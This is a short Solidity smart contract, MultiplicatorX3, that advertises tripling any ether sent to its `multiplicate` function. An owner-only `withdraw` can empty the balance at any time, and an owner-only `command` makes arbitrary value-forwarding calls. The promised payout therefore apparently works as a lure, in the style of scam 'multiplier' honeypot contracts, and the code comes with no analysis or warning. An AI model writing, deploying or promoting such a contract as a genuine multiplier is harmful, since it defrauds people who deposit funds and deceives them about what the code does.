pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner;

    function MultiplicatorX3() public {
        owner = msg.sender;
    }

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }

    function multiplicate(address adr) public payable {
        require(msg.value > 0);
        if (this.balance >= msg.value) {
            require(adr.send(msg.value * 3));
        }
    }
}